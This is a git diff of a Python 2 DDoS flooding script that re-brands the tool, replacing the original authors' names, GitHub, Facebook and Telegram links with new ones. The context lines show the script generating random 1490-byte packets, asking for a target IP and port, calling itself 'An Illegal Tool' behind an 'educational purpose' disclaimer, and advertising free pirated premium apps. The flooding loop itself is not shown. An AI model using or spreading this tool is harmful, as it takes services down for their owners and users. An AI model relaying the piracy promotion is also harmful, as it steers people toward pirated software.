@@ -19,14 +19,12 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet V-DdoS")
+os.system("figlet ddos")
 print
-print "Coded By : Mr.BL4Z3"
-print "Author   : T34m V18rs"
-print "Github   : github.com/T34mV18rs"
-print "Fb Page  : facebook.com/TeamVirusOfficial"
-print "FB Group : facebook.com/groups/mohinhossen"
-print "Telegram : t.me/Crackerspace"
+print "Coded By : ATOMEDIA"
+print "Author   : SIDHANIE"
+print "Github   : github.com/kdsmedia"
+print "Telegram : t.me/altoimediacloudbot"
 print "Join Cracker Space TG Group To Get Premium Apk(s) Free"
 print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems"
 print
@@ -34,8 +32,8 @@ ip = raw_input("IP Target : ")
 port = input("Port       : ")
 os.system("clear")
 print("\033[93m")
-os.system("figlet DdoS Attack")
-print("Team : T34m V18rs")
+os.system("figlet ddos Attack")
+print("Team : ALTOMEDIA")
 print ("\033[92m")
 print "[                    ] 0% "
 time.sleep(5)
